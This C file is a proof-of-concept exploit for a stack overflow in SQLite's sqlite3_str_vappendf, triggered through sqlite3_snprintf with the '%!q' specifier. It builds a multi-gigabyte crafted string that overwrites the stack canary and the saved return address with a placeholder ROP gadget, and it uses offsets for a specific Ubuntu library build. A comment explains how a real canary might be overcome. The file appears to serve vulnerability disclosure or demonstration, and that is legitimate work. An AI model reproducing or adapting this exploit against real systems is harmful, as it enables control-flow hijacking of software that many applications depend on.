/*
 * Exploit will set saved return address to 0xdeadbeefdeadbeef and stack canary
 * to 0xbaadd00dbaadd00d when sqlite3_str_vappendf returns. Can confirm by
 * executing this program and observing a stack check fail, or by executing in
 * gdb and inspecting the frame prior to stack check fail.
 *
 * A real canary value will have a NULL byte, which would defeat this specific
 * exploit, but other format string values could allow an attacker multiple
 * opportunities to overwrite the stack values and set a NULL byte
 * appropriately.
 *
 * Exploit depends on:
 * - A priori knowledge of canary value (e.g. 0xbaadd00dbaadd00d)
 * - Format string specifier set to "!q"
 */

#include <assert.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

// Offsets relative to sqlite3_str_vappendf stack frame base. Calculated using
// the version of libsqlite3.so.0.8.6 provided by apt on Ubuntu 20.04.
#define RETADDR_OFFSET  0
#define CANARY_OFFSET   0x40
#define BUF_OFFSET      0x88
#define CANARY          0xbaadd00dbaadd00dull
#define ROPGADGET       0xdeadbeefdeadbeefull
#define NGADGETS        1

struct payload {
    uint8_t padding1[BUF_OFFSET-CANARY_OFFSET];
    uint64_t canary;
    uint8_t padding2[CANARY_OFFSET-RETADDR_OFFSET-8];
    uint64_t ropchain[NGADGETS];
}__attribute__((packed, aligned(1)));

int main(int argc, char *argv[]) {
    char dst[256];
    struct payload p;
    memset(p.padding1, 'a', sizeof(p.padding1));
    p.canary = CANARY;
    memset(p.padding2, 'b', sizeof(p.padding2));
    p.ropchain[0] = ROPGADGET;

    size_t target_n = 0x80000000;
    assert(sizeof(p) + 3 <= target_n);
    size_t n = target_n - sizeof(p) - 3;
    size_t target_i = 0x100000000 + (sizeof(p) / 2);

    char *src = calloc(1, target_i);
    if (!src) { printf("bad allocation\n"); return -1; }

    size_t cur = 0;
    memcpy(src, &p, sizeof(p));
    cur += sizeof(p);
    memset(src+cur, '\'', n/2);
    cur += n/2;
    assert(cur < 0x7ffffffeul);
    memset(src+cur, 'c', 0x7ffffffeul-cur);
    cur += 0x7ffffffeul-cur;
    src[cur] = '\xc0';
    cur++;
    memset(src+cur, '\x80', target_i - cur);
    cur = target_i;
    src[cur-1] = '\0';

    sqlite3_snprintf((int) 256, dst, "'%!q'", src);
    free(src);
    return 0;
}
